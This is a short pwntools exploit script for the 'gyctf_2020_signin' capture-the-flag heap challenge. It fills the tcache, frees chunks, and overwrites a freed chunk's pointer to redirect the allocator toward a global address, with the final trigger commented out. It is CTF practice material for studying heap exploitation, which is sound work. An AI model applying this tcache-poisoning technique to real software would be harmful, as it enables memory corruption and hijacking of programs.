# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
binary = './gyctf_2020_signin'
elf = ELF(binary)
libc = elf.libc
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '25579'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def cmd(num):
    sla('?',num)

def add(id):
    cmd(1)
    sla("?",id)

def edit(id,text):
    cmd(2)
    sla("?",id)
    sleep(0.1)
    se(text)

def delete(id):
    cmd(3)
    sla("?",id)

ptr = 0x00000000004040C0

for i in range(8):
    add(i)

for i in range(8):
    delete(i)

add(8)

edit(7 , p64( ptr - 0x10 ))

#unsortedbin指向头，而tache指向用户区域，两者之间有0x10的偏移

#dbg()

#cmd(6)


p.interactive()

'''
@File    :   gyctf_2020_signin.py
@Time    :   2021/07/14 18:23:18
@Author  :   Niyah 
'''
